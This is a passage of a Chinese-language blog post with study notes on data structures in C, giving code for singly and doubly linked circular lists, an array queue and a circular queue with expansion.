= <span class="hljs-literal">NULL</span>;<br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (cur) &#123;<br>        tmp = cur;<br>        cur = cur-&gt;next;<br>        tmp-&gt;next = l-&gt;head.next;<br>        l-&gt;head.next = tmp;<br>        l-&gt;len++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt;= l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    <span class="hljs-keyword">return</span> prev-&gt;next-&gt;val;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br><br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, p-&gt;val);<br>        p = p-&gt;next;<br>        (p != <span class="hljs-literal">NULL</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    List *l = initList();<br><br>    getchar();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;n * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%c"</span>, &amp;c);<br>        <span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">40</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!insertValue(l, i / <span class="hljs-number">2</span>, c)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!reverse(l)) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    (<span class="hljs-keyword">void</span>)showList(l);<br><br>    freeList(l);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4><span id="双向循环">双向循环</span></h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">prev</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">List</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// Node *head; 改为 dummy node, 而不再是一个指针</span><br>    Node head;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; List;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    n-&gt;prev = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">List *<span class="hljs-title">initList</span><span class="hljs-params">()</span> </span>&#123;<br>    List *l = (List *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(List));<br>    l-&gt;head.next = <span class="hljs-literal">NULL</span>;<br>    l-&gt;head.prev = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// not necessarily</span><br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *del_ = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> len = l-&gt;len;<br>    <span class="hljs-keyword">while</span> (len) &#123; <span class="hljs-comment">// 更改为按长度free</span><br>        del_ = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(del_);<br>        len--;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(l);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入节点: 更改为循环链表</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertNode</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt; l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (l-&gt;len == <span class="hljs-number">0</span>) &#123;<br>        l-&gt;head.next = n;<br>        n-&gt;prev = n;<br>        n-&gt;next = n;<br>        l-&gt;len++;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    Node *prev = l-&gt;head.next;<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    n-&gt;next = prev-&gt;next;<br>    prev-&gt;next = n;<br><br>    n-&gt;prev = prev;<br>    <span class="hljs-keyword">if</span> (n-&gt;next)<br>        n-&gt;next-&gt;prev = n;<br><br>    <span class="hljs-keyword">if</span> (n == l-&gt;head.next-&gt;next) &#123;<br>        l-&gt;head.next = n;<br>    &#125;<br><br>    l-&gt;len++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertValue</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = initNode(val);<br>    <span class="hljs-keyword">if</span> (!insertNode(l, idx, n)) &#123;<br>        freeNode(n);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 更改为循环链表 从 k 位置反向输出</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showList</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    <span class="hljs-keyword">int</span> c = l-&gt;len;<br>    <span class="hljs-keyword">while</span> (p-&gt;val != k &amp;&amp; c) &#123;<br>        p = p-&gt;next;<br>        c--;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span> &amp;&amp; p-&gt;val != k) <span class="hljs-keyword">return</span>;<br><br>    Node *tmp = p;<br>    <span class="hljs-keyword">int</span> len = l-&gt;len;<br><br>    <span class="hljs-keyword">while</span> (tmp != p-&gt;next) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, tmp-&gt;val);<br>        tmp = tmp-&gt;prev;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, p-&gt;next-&gt;val);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, val;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br><br>    List *l = initList();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;val);<br>        insertValue(l, i, val);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;k);<br>    showList(l, k);<br><br>    freeList(l);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><hr><h2><span id="队列">队列</span></h2><p>队列有一个很重要的性质，就是 <strong>先进先出</strong> ，First InFirst Out(FIFO)。</p><p>利用两个变量head和tail维护队列的进出。</p><h3><span id="简单实现">简单实现</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Queue</span>&#123;</span><br>    <span class="hljs-keyword">int</span> *data;<br>    <span class="hljs-keyword">int</span> head, tail, length;<br>&#125;Queue;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    q-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length);<br>    q-&gt;head = <span class="hljs-number">0</span>;<br>    q-&gt;tail = <span class="hljs-number">-1</span>;<br>    q-&gt;length = length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> element)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (q-&gt;tail + <span class="hljs-number">1</span> &gt;= q-&gt;length) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    q-&gt;data[++q-&gt;tail] = element;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = q-&gt;head; i &lt;= q-&gt;tail; ++i) &#123;<br>        (i != q-&gt;head) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, q-&gt;data[i]);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">front</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;data[q-&gt;head];<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    q-&gt;head++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;head &gt; q-&gt;tail;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(q-&gt;data);<br>    <span class="hljs-built_in">free</span>(q);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *<span class="hljs-built_in">queue</span> = (Queue *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Queue));<br>    init(<span class="hljs-built_in">queue</span>, <span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">int</span> n, val;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;val);<br>        <span class="hljs-keyword">if</span> (!push(<span class="hljs-built_in">queue</span>, val)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!empty(<span class="hljs-built_in">queue</span>)) &#123;<br>        <span class="hljs-keyword">int</span> k;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;k);<br>        <span class="hljs-keyword">while</span> (k--) &#123;<br>            pop(<span class="hljs-built_in">queue</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!empty(<span class="hljs-built_in">queue</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, front(<span class="hljs-built_in">queue</span>));<br>        output(<span class="hljs-built_in">queue</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0"</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">clear</span>(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="循环队列">循环队列</span></h3><p>在循环队列里，不能单纯通过比较 tail 和 head标记来判断循环队列是否已满，否则在初始化状态就会被认为循环队列已满。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Queue</span> &#123;</span><br>    <span class="hljs-keyword">int</span> *data;<br>    <span class="hljs-keyword">int</span> head, tail, length, count;<br>&#125;Queue;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    q-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length);<br>    q-&gt;length = length;<br>    q-&gt;head = <span class="hljs-number">0</span>;<br>    q-&gt;tail = <span class="hljs-number">-1</span>;<br>    q-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 扩容需要考虑循环结构</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">expand</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">int</span> expsize = q-&gt;length;<br>    <span class="hljs-keyword">int</span> *tmp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (expsize &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 因为要重新组织数据，所以不用realloc了</span><br>        tmp = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (q-&gt;length + expsize));<br>        <span class="hljs-keyword">if</span> (tmp) <span class="hljs-keyword">break</span>;<br>        expsize &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!tmp) <span class="hljs-keyword">return</span> ERROR;<br><br>    <span class="hljs-comment">// 复制到新空间中</span><br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">end</span> = (q-&gt;tail + <span class="hljs-number">1</span>) % q-&gt;length;<br>    <span class="hljs-keyword">for</span> (i = q-&gt;head, j = <span class="hljs-number">0</span>; i != <span class="hljs-built_in">end</span>; i = (i + <span class="hljs-number">1</span>) % q-&gt;length, j++) &#123;<br>        tmp[j] = q-&gt;data[i];<br>    &#125;<br>    <span class="hljs-built_in">free</span>(q-&gt;data);<br>    q-&gt;data = tmp;<br>    q-&gt;length += expsize;<br>    q-&gt;head = <span class="hljs-number">0</span>;<br>    q-&gt;tail = j - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Queue *q, <span class="hljs-keyword">int</span> element)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (q-&gt;count &gt;= q-&gt;length) &#123;<br>        <span class="hljs-keyword">if</span> (!expand(q))<br>            <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    q-&gt;tail = (q-&gt;tail + <span class="hljs-number">1</span>) % q-&gt;length; <span class="hljs-comment">// 环 取余</span><br>    q-&gt;data[q-&gt;tail] = element;<br>    q-&gt;count++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i = q-&gt;head; <span class="hljs-comment">// 从 head 到 tail</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, q-&gt;data[i]);<br>        i = (i + <span class="hljs-number">1</span>) % q-&gt;length;<br>    &#125; <span class="hljs-keyword">while</span>(i != (q-&gt;tail + <span class="hljs-number">1</span>) % q-&gt;length);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">front</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;data[q-&gt;head];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    q-&gt;head = (q-&gt;head + <span class="hljs-number">1</span>) % q-&gt;length; <span class="hljs-comment">// 环 取余</span><br>    q-&gt;count--;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;count == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(q-&gt;data);<br>    <span class="hljs-built_in">free</span>(q);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *q = (Queue *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Queue));<br>    init(q, <span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++) &#123;<br>        push(q, i);<br>    &#125;<br>    output(q);<br>    <span class="hljs-keyword">if</span> (!empty(q)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, front(q));<br>        pop(q);        <br>    &#125;<br>    output(q);<br>    <span class="hljs-built_in">clear</span>(q);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="链表实现队列">链表实现队列</span></h3><p>链表使用了一个dummy node.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 